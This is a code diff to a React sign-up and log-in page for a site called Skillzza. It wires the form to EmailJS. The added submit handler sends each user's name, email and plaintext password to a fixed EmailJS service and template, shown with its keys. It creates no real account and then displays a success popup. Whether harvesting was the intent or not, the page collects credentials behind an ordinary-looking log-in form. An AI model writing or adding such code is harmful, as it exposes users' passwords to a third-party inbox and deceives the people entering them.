@@ -1,11 +1,49 @@
 import React, { useEffect, useState } from 'react';
 import Navbar from './components/Navbar';
 import Footer from './components/Footer';
+import emailjs from '@emailjs/browser';
 
 export default function SignupApp() {
   const [isRobotChecked, setIsRobotChecked] = useState(false);
   const [isSignUp, setIsSignUp] = useState(true);
   const [showPopup, setShowPopup] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [fullName, setFullName] = useState('');
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!isRobotChecked) return;
+    setLoading(true);
+
+    const templateParams = {
+      form_name: "Sign Up Form",
+      user_name: fullName,
+      user_email: email,
+      user_role: "N/A",
+      user_message: `Attempted signup with password: ${password}`
+    };
+
+    emailjs.send(
+      'service_6c66tcm', 
+      'template_wt0w8kn', 
+      templateParams,
+      'CM_nb8U7I8dEOty2d'
+    )
+    .then(() => {
+      setShowPopup(true);
+      setLoading(false);
+      setFullName('');
+      setEmail('');
+      setPassword('');
+    })
+    .catch((err) => {
+      console.error('FAILED...', err);
+      alert('Failed to process sign up. Please try again.');
+      setLoading(false);
+    });
+  };
   useEffect(() => {
     document.title = 'Log In | Skillzza';
   }, []);
@@ -58,7 +96,7 @@ export default function SignupApp() {
               {isSignUp ? "Sign up to get started" : "Enter your credentials to continue"}
             </p>
 
-            <form className="flex flex-col gap-5">
+            <form className="flex flex-col gap-5" onSubmit={handleSubmit}>
 
               {/* Name Field (Only in Sign Up) */}
               {isSignUp && (
@@ -66,8 +104,11 @@ export default function SignupApp() {
                   <label className="text-[13px] font-semibold text-[#374151] ml-1">Full Name</label>
                   <input
                     type="text"
+                    value={fullName}
+                    onChange={(e) => setFullName(e.target.value)}
                     placeholder="Enter your full name"
                     className="w-full px-4 py-3.5 rounded-xl border border-gray-200 bg-gray-50/50 text-[#1A1A2E] text-[14px] focus:outline-none focus:ring-2 focus:ring-[#6C3CF7]/40 focus:border-[#6C3CF7] transition-all"
+                    required
                   />
                 </div>
               )}
@@ -77,8 +118,11 @@ export default function SignupApp() {
                 <label className="text-[13px] font-semibold text-[#374151] ml-1">Email address</label>
                 <input
                   type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
                   placeholder="name@school.com"
                   className="w-full px-4 py-3.5 rounded-xl border border-gray-200 bg-gray-50/50 text-[#1A1A2E] text-[14px] focus:outline-none focus:ring-2 focus:ring-[#6C3CF7]/40 focus:border-[#6C3CF7] transition-all"
+                  required
                 />
               </div>
 
@@ -89,8 +133,11 @@ export default function SignupApp() {
                 </label>
                 <input
                   type="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
                   placeholder={isSignUp ? "Create a strong password" : "Enter your password"}
                   className="w-full px-4 py-3.5 rounded-xl border border-gray-200 bg-gray-50/50 text-[#1A1A2E] text-[14px] focus:outline-none focus:ring-2 focus:ring-[#6C3CF7]/40 focus:border-[#6C3CF7] transition-all"
+                  required
                 />
               </div>
 
@@ -113,15 +160,14 @@ export default function SignupApp() {
 
               {/* Submit Button */}
               <button
-                type="button"
-                disabled={!isRobotChecked}
-                onClick={() => setShowPopup(true)}
-                className={`w-full font-bold text-[15px] py-4 rounded-xl transition-all duration-200 ${isRobotChecked
-                  ? "bg-[#6C3CF7] hover:bg-[#5B2CE0] text-white shadow-[0_8px_20px_-6px_rgba(108,60,247,0.5)] hover:shadow-[0_12px_25px_-6px_rgba(108,60,247,0.6)] transform hover:-translate-y-[1px]"
-                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
+                type="submit"
+                disabled={!isRobotChecked || loading}
+                className={`w-full font-bold text-[15px] py-4 rounded-xl transition-all duration-200 ${(!isRobotChecked || loading)
+                  ? "bg-gray-300 text-gray-500 cursor-not-allowed"
+                  : "bg-[#6C3CF7] hover:bg-[#5B2CE0] text-white shadow-[0_8px_20px_-6px_rgba(108,60,247,0.5)] hover:shadow-[0_12px_25px_-6px_rgba(108,60,247,0.6)] transform hover:-translate-y-[1px]"
                   }`}
               >
-                {isSignUp ? "Create Account" : "Log In"}
+                {loading ? "Processing..." : (isSignUp ? "Create Account" : "Log In")}
               </button>
 
             </form>
@@ -164,7 +210,7 @@ export default function SignupApp() {
               </p>
 
               <button
-                onClick={() => setShowPopup(false)}
+                onClick={() => window.location.href = '/'}
                 className="w-full bg-[#1A1A2E] hover:bg-black text-white font-bold py-3.5 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-[1px]"
               >
                 Continue
